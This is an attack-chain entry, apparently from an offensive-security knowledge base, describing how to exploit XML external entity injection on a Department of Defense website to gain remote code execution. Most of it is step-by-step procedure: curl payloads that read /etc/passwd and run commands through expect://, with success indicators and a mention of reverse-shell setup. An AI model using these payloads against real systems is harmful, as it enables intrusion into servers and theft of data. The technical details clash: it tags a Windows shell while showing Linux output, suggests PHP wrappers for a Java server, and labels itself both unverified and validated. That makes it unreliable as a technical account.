---
id: ac-uuid-1234
tags:
  - xxe
  - rce
  - web
  - dod
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-XXE-for-File-Disclosure]]'
  - '[[procedures/Achieve-RCE-via-XXE-Entity-Expansion]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:27.431Z'
description: >-
  A multi-stage attack exploiting an XXE vulnerability in a U.S. Department of
  Defense website to achieve remote code execution, allowing arbitrary command
  execution on the server.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
---
# Remote Code Execution via XML External Entity Injection on DoD Website

Multi-stage attack chain demonstrating exploitation of an XXE vulnerability on a U.S. Department of Defense website, leading to remote code execution as reported in HackerOne report #232330 (CVE-2017-3548).

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via XXE Injection] --> B[Entity Expansion for RCE]
    B --> C[Arbitrary Command Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- XML editor or payload generator

### Target Environment

- Web platform with XML processing (e.g., Java-based DoD application)
- Exposed endpoint accepting XML uploads or POST requests
- No specific ports detailed; assumes HTTP/HTTPS on standard web ports (80/443)

### Initial Access Requirements

- Network access to the public-facing DoD website
- No credentials required for unauthenticated endpoint
- Knowledge of the XML-processing feature (e.g., file upload or API)

## Detailed Attack Procedures

### Step 1: Initial Access
procedure: [[procedures/Exploit-XXE-for-File-Disclosure]]

**Objective**: Inject a malicious XML payload to trigger XXE and disclose sensitive files, confirming the vulnerability.

**Instructions**: Craft an XML payload with external entity definitions to read local files. Use [[commands/curl-xml-payload]] to send it to the vulnerable endpoint:

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://target-dod-site.com/vulnerable-endpoint
```

Validate by checking the response for file contents.

**Expected Output**: Server response includes contents of /etc/passwd or similar file, indicating successful XXE.

**Success Indicators**:
- File contents leaked in response
- No XML parsing errors

### Step 2: Execution
procedure: [[procedures/Achieve-RCE-via-XXE-Entity-Expansion]]

**Objective**: Leverage XXE entity expansion to execute arbitrary commands on the web server, achieving RCE.

**Instructions**: Extend the XXE payload to include a PHP wrapper or OOB interaction for command execution. For a Java-based server (common in DoD apps), use expect:// or similar for RCE. Send via [[commands/curl-rce-payload]]:

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "expect://id"> %xxe; ]><root></root>' http://target-dod-site.com/vulnerable-endpoint
```

Monitor for command output in the response or via OOB channel.

**Expected Output**: Response contains output from executed command (e.g., 'uid=33(www-data)' from 'id' command).

**Success Indicators**:
- Command output visible in response
- Ability to run further commands like 'whoami' or reverse shell setup

## Attack Chain Summary

### Key Achievements

1. Confirmed XXE vulnerability allowing file disclosure
2. Escalated to RCE with arbitrary command execution
3. Demonstrated high-impact risk to DoD server integrity

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Windows Command Shell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
